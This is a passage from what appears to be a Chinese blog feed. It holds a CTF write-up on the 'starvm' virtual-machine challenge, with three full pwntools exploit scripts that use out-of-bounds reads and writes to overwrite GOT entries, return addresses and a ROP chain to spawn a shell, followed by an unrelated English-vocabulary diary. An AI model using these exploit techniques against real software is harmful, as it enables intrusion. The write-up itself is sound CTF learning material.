pwn，是一个c++写的哈佛架构的虚拟机,c++的stl逆向好难懂,但是vm pwn最主要的就是逆清楚虚拟机结构体和指令操作，难搞哦</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt; codestack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; datastack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt;::iterator ip;</span><br><span class="line">    <span class="type">int</span> reg[<span class="number">14</span>]; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* mem;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> eflags;</span><br><span class="line"></span><br><span class="line">&#125; starvm;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> instr_code;<span class="comment">//操作码</span></span><br><span class="line">    <span class="type">int</span> instr_num;<span class="comment">//操作数的个数</span></span><br><span class="line">&#125;instr;</span><br></pre></td></tr></table></figure><p>指令储存和数据储存分开，先初始化code后初始化data，然后就是取指令 译码 执行 更新pc的操作</p><blockquote><p>vector的结构</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">vector</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_9) ; XREF:</span><br><span class="line"><span class="number">00000000</span>                                         </span><br><span class="line"><span class="number">00000000</span> _M_start dq ?</span><br><span class="line"><span class="number">00000008</span> _M_finish dq ?</span><br><span class="line"><span class="number">00000010</span> _M_end_of_storage dq ?</span><br><span class="line"><span class="number">00000018</span> <span class="built_in">vector</span> ends</span><br></pre></td></tr></table></figure></blockquote><p>漏洞是data初始化时没有限制数字，在6 7指令会导致申请的堆的越界读写，10指令没有检查值会寄存器越界覆盖掉mem指针，漏洞都可以造成任意地址读写</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> VM_LOAD:<span class="number">6</span></span><br><span class="line">            <span class="comment">// load reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(vmp-&gt;mem == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    vmp-&gt;mem = (<span class="type">unsigned</span> <span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// oob read</span></span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;mem[meml];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_UNLOAD:<span class="number">7</span></span><br><span class="line">            <span class="comment">// unload reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                vmp-&gt;mem[meml] = vmp-&gt;reg[op1];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_MOVINT:</span><br><span class="line">                <span class="comment">// MOVINT reg, int</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>ex师傅那里的思路就是mallocgot为setvbuf，setvbufgot为system，然后修改sevbuf参数stdin指向字符串sh，最后再把mem指针置零触发maloc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x401754&#x27;)</span></span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x404020</span>, <span class="comment"># 10  mem=0x404020 setvbufgot</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x30910</span>, <span class="comment"># 10    reg[1]=0x30910</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># 3        reg[0]=mem[0]0x81670-0x30910 system</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7         setvbufgot=system</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x404070</span>, <span class="comment"># 10     mem=malloc</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x401270</span>, <span class="comment"># 10    reg[0]=0x401270</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     mallocgot=0x401270</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     mallocgot高位=0</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x4040D0</span>, <span class="comment"># 10 mem=stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x4040D8</span>, <span class="comment"># 10    reg[0]=0x4040D8</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x6873</span>, <span class="comment"># 10    reg[1]=0x6873 sh</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     stdinlow=0x4040D8</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     stdinhigh=0</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="comment"># 7     0x4040D8=0x6873</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0</span>, <span class="comment"># 10    mem置零</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        触发malloc</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>由于一开始给了栈地址，就想着修改返回地址为ogg，但是glibc2.35的ogg太难用了，没一个成功</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x00401A38&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#修改mem为栈上main的返回地址</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#6 reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>,ogg,<span class="comment">#10 reg[op1]=ogg</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">1</span>,<span class="comment">#2 reg[0]=reg[1] + reg[0]</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">  rbp == NULL || (u16)[rbp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>有个syscal ret的gadget做后门可以写rop链</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b *0x40198B&#x27;)</span></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x401325&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401468</span></span><br><span class="line">xorrdx=<span class="number">0x0000000000401464</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004017cb</span></span><br><span class="line">poprsi=<span class="number">0x00000000004016f0</span></span><br><span class="line">syscall=<span class="number">0x000000000040146a</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">sh_str=stack_ret+<span class="number">0x40</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">0</span>,poprsi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">1</span>, <span class="comment">#7  pop rsi</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">2</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">3</span>,<span class="comment">#7  0</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rdi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">4</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">5</span>, <span class="comment">#7 pop rdi</span></span><br><span class="line">        <span class="number">0</span>,sh_str&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">6</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,(sh_str&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">7</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,xorrdx,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">8</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">9</span>, <span class="comment">#7 xorrdx</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rax,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">10</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">11</span>,<span class="comment">#7 pop rax</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,<span class="number">0x3b</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">12</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">13</span>,<span class="comment">#7  0x3b</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,syscall,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">14</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">15</span>, <span class="comment">#7 syscall</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x6e69622f</span>, <span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">16</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x68732f</span>, <span class="comment">#10 </span></span><br><span class="line">        <span class="number">0</span>,<span class="number">17</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><p>去符号表的rust程序，基本看不懂反汇编，只能配合gdb调试现象来看</p><p>第一次先添加了ffff，又添加了dddd，发现是申请了一个0x71大小的堆块来做管理结构，堆块的大小和输入的内容相关</p><p><img src="/2023/08/02/startctf/image-20230806192723745.png" alt="image-20230806192723745"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>English learning August 2023</title>
      <link href="/2023/08/01/Englishlearning-August2023/"/>
      <url>/2023/08/01/Englishlearning-August2023/</url>
      
        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>emm，大概很久以前就意识到英文的重要，但是没坚持下来过😂，积硅步至千里，积小流成江海   2023.8.1 grxer</p><h2 id="8-1"><a href="#8-1" class="headerlink" title="8.1"></a>8.1</h2><p><a href="https://www.bilibili.com/video/BV1Uk4y13716/">https://www.bilibili.com/video/BV1Uk4y13716/</a></p><p>I suppose i mentally began becoming barbie as soon as i read the script ,i just couldn’t.., not read the script , and be like playing it out in my head ,and kinda trying it on ,and seeing if it fit ,and like ,“oh how am i gonna do what？” </p><p>我觉得刚一读完剧本，我就精神上把自己带入到芭比了。我只是不能..，没读剧本，我就会在脑海里描述那个画面，试一下看看是否适合我，会想“我会怎么来演?”</p><ul><li><p>script n.剧本，讲稿</p><p>My editor didn’t have time to edit my script last week</p><p>我的编辑上周没有时间编辑我的剧本</p></li><li><p>play out 逐渐发生 结束</p><p>there are plenty of ways this can play out</p><p>有非常多的方法可以让这个发生</p></li></ul><blockquote><p>句子中”becoming”（现在分词）的使用强调了这个动作的持续性，暗示着在阅读剧本之后，心理上扮演芭比的过程继续进行着。</p></blockquote><h2 id="8-2"><a href="#8-2" class="headerlink" title="8.2"></a>8.2</h2><p><a href="https://www.bilibili.com/video/BV16K41117Nc">https://www.bilibili.com/video/BV16K41117Nc</a></p><p>You know how much is gonna cost to fix that fridge </p><p>你知道修冰箱要花多少钱码</p><p>Two hundred dollars ,I have really good hearing</p><p>两百美元，我听力很好</p><p>Do you have any idea how hard i work for the money we get?</p><p>你知道赚钱有多辛苦吗</p><p>I‘m sorry</p><p>I don’t care how long it takes ,You’re gonna pay me back every cent to this</p><p>我不管要多久，你要把(修冰箱的)每一分钱还给我</p><h2 id="8-3"><a href="#8-3" class="headerlink" title="8.3"></a>8.3</h2><p><a href="https://www.bilibili.com/video/BV1t8411E7rb">https://www.bilibili.com/video/BV1t8411E7rb</a></p><p>what are you doing here</p><p>你怎么来了</p><p>Officer Burke filled me in.You okay?</p><p>Burke警官给我讲了事情的经过，你没事吧 </p><p>I passed my driving test. there is that</p><p>我驾照考试过了，就是这样</p><p>Congratulation</p><p>恭喜</p><p>Seriously what are you doing here</p><p>讲真的，你来这干嘛</p><p>Came over the radio, there was a shooting, they mentioned your name</p><p>我从无线电里听到发生了枪击，他们提到了你的名字</p><ul><li><p>fill sb in 向某人提供情况</p><p>Anyone want to fill me in on what happened</p><p>有人能告诉我发生什么了吗</p></li><li><p>shooting n.枪击 枪杀</p><p>Recently just lost one of their other friends in a shooting</p><p>最近刚在一次枪击中失去了一位朋友</p></li><li><p>mention v.提到 n.提及</p><p>I mentioned it affects how we think about output</p><p>我提到了他会影响我们对产出的看法</p></li></ul><h2 id="8-4"><a href="#8-4" class="headerlink" title="8.4"></a>8.4</h2><p><a href="https://www.bilibili.com/video/BV1gK411271R">https://www.bilibili.com/video/BV1gK411271R</a></p><p>Hey. Uh.I ordered mine whitout ketchup</p><p>嘿，我点的是不要番茄酱的</p><p>Oh,right i’ll be right back</p><p>哦，对，我马上回来</p><p>No ketchup, that’s  very un-American</p><p>不要番茄酱，那太不美国了</p><p>i’m full of surprises</p><p>我充满了惊喜</p><p>so what’s your story then</p><p>能聊聊你的故事吗</p><p>my story?</p><p>我的故事?</p><p>year,like your, your family? How you ended up here</p><p>对啊，比如你的，你的家庭，为什么会到这</p><p>pass ，i just don’t think aksing a abunch of arbitrary questions about someone’s past  is really gonna tell you who they are</p><p>不聊这个，我只是觉得问一堆任意的关于别人过去的问题也不能真的就了解他们</p><ul><li><p>end up 最终，最终到达</p><p>every would buy a plane ticket and end up in california</p><p>每个人都可以买机票然后去california</p></li><li><p>arbitrary 任意的，武断的</p><p>that’s not an arbitrary number</p><p>那不是一个任意的数字</p></li></ul><h2 id="8-5"><a href="#8-5" class="headerlink" title="8.5"></a>8.5</h2><p><a href="https://www.bilibili.com/video/BV1uM41117jL">https://www.bilibili.com/video/BV1uM41117jL</a></p><p>Oh ,so sorry I’m late,Oh you won’t believe what happened,My neighbor had a massive fire in her kitchen,like a reall fire,And her cat just had five kittens,and she could’t find them all,I mean,what was i gonna do?</p><p>Not help her find the kittens</p><ul><li>massive 非常严重的；大量的，大规模的；</li><li>kitten 小猫，幼崽</li></ul><h2 id="8-6"><a href="#8-6" class="headerlink" title="8.6"></a>8.6</h2><p><a href="https://www.bilibili.com/video/BV1AM41117wC">https://www.bilibili.com/video/BV1AM41117wC</a></p><p>Apparently some guy you were stuck in the elevator with asked security for your contact info</p><p>貌似之前和你困在电梯的人去找保安问你的联系方式了</p><p>Was it the delivery man?</p><p>是那个送货的吗</p><p>No,Um some big shot who works in the building 。 I guss he has crush on you or something</p><p>不是，是在这座大厦工作的某个大佬，我猜他可能是对你有好感了</p><ul><li><p>apparently adv.据说，貌似</p></li><li><p>bebig shot  大佬</p></li><li><p>have a crush on sb 对某人有好感，暗恋某人</p></li></ul><h2 id="8-7"><a href="#8-7" class="headerlink" title="8.7"></a>8.7</h2><p><a href="https://www.bilibili.com/video/BV17x4y1G7EH/">https://www.bilibili.com/video/BV17x4y1G7EH/</a></p><p>wanna you go on in？</p><p>要进来坐吗</p><p>no，why don’t you set me up outside</p><p>不了，你给我在外面摆一桌吧</p><p>outside? It’s freezing out here</p><p>外面？外面冻死了</p><p>well, a little cold never hurt anybody.</p><p>一点小冷冻不坏的</p><p>anything you say ,Frank .it’ll be rignt up</p><p>听你的frank，这就上菜</p><p>My one guilty pleasure is a good rack of ribs even at seven thirty in the morning.I had the whole place to myself.</p><p>我唯一一个有罪恶的乐趣是一顿好的烤猪排，即使是七点半这么早。整个地址就我一个人</p><ul><li>freezing adj.极冷的；冰点以下的</li><li>guilty pleasure 作恶的快感</li><li>rack of 一排</li><li>rib 肋骨，排骨</li></ul><h2 id="8-8"><a href="#8-8" class="headerlink" title="8.8"></a>8.8</h2><p><a href="https://www.bilibili.com/video/BV1i8411P7Wu">https://www.bilibili.com/video/BV1i8411P7Wu</a></p><p>where’s my driver’s license,Oh there you go</p><p>我的驾照在哪里？哦，给你</p><p>That‘s a school id card ,I’ll need a valid driver’s license</p><p>这是学生证，我需要有效的驾驶执照</p><p>Oh,come on ,look at that face,don’t you just wanna let me in?</p><p>哦，行啦，看看这张脸，你不想让我进去吗?</p><p>you‘re gonna need to make a u-turn and exit immediately</p><p>你需要掉头立即离开</p><ul><li><p>there you go 给你</p></li><li><p>driver’s license 驾照</p></li><li><p>u-turn n.掉头，大转变</p><p>American health insurers, having long opposed this idea,have preformed a starting U-turn in recent weeks</p><p>美国医疗保险公司一直都反对这一想法但是他们的态度在最近几周来了个惊人的转变</p></li></ul><h2 id="8-9"><a href="#8-9" class="headerlink" title="8.9"></a>8.9</h2><p><a href="https://www.bilibili.com/video/BV1pA411Z7u7">https://www.bilibili.com/video/BV1pA411Z7u7</a></p><p>babe,please don’t smoke,it’ll kill your palate</p><p>宝贝请不要吸烟，它会破坏你的味蕾</p><p>then my palate will die happy</p><p>那我的味蕾也死而无憾了</p><p>hey Margot,tonight is huge ,okay? The “flavor profiles”,it’s all super dilicate</p><p>margot,今晚真的很重要，好吗，都是些口感细腻的菜肴</p><p>when you smoke，you ruin your ability to be able appreciate them。</p><p>你抽烟的时候，你就毁掉你去体会他们的能力，</p><p>Oh come on </p><p>哦，得了吧</p><p>please please</p><p>秋梨膏</p><ul><li><p>palate n.上腭；味觉，品尝力</p><p>you have a picky palate</p><p>你有一个挑剔的味觉</p></li><li><p>flavor profiles 烹饪口味</p></li><li><p>delicate adj.微妙的，需要谨慎处理</p><p>so it’s just a very delicate matter</p><p>所以它是一个非常需要谨慎处理的事</p></li></ul><h2 id="8-10"><a href="#8-10" class="headerlink" title="8.10"></a>8.10</h2><p><a href="https://www.bilibili.com/video/BV1jK411C7yE/">https://www.bilibili.com/video/BV1jK411C7yE/</a></p><p>marta ，i know three things,one I know he didn’t commit suicide</p><p>我知道三件事，第一，我知道他不是自杀</p><p>what makes you think that</p><p>你为什么那么想</p><p>i don’t you think it，i know it,because i knew my granddad </p><p>我不是想象，我就是知道，因为我了解我外公</p><p>Maybe you and  I were the only two who knew him</p><p>可能只有你和我了解他</p><p>so you’re not gonna bullshit me on this</p><p>所以你不会在这件事上糊弄我</p><p>because two，i know lying makes you puke</p><p>第二我知道撒谎会让你呕吐</p><ul><li><p>commit suicide 自杀</p><p>You’re much more likely to commit suicide</p><p>你很有可能自杀</p></li><li><p>puke v.n. 呕吐</p></li></ul><h2 id="8-11"><a href="#8-11" class="headerlink" title="8.11"></a>8.11</h2><p><a href="https://www.bilibili.com/video/BV1ER4y127FE">https://www.bilibili.com/video/BV1ER4y127FE</a></p><p>This guy took me to the movies once ,Halfway through ,he goes to the bathroom,and when he comes back ,he sits three rows in front of me and puts his arm around some random girl</p><p>有一次，有个男的带我看电影，看到一半，他出去上厕所，当他回来的时候，他竟然坐在我前面三排的地方，还搂着一个不认识的女孩</p><p>he thought she was you?</p><p>他把那个女孩认成你了?</p><p>I didn’t stick around to find out</p><p>我没待到最后，不知道怎么回事</p><ul><li>halfway through 进行到一半</li><li>stick around 逗留，在附近徘徊</li></ul><h2 id="8-12"><a href="#8-12" class="headerlink" title="8.12"></a>8.12</h2><p><a href="https://www.bilibili.com/video/BV14R4y1276A/">https://www.bilibili.com/video/BV14R4y1276A/</a></p><p>sorry the train was late ,you look great,i am growing out my bangs</p><p>抱歉，火车晚点了，你看起来真不错，我正在留我的刘海呢</p><p>oh where is rick?</p><p>rick在哪</p><p>rick’s on a business trip for his business</p><p>rick在出差中呢，为了他的生意</p><p>oh nuts!I was looking forward to finally meeting him，at least this doesn’t make balloon animals</p><p>真是的，我还期待着终于能见到他呢，至少这次这个不是以这气球动物为生的</p><ul><li>grow up 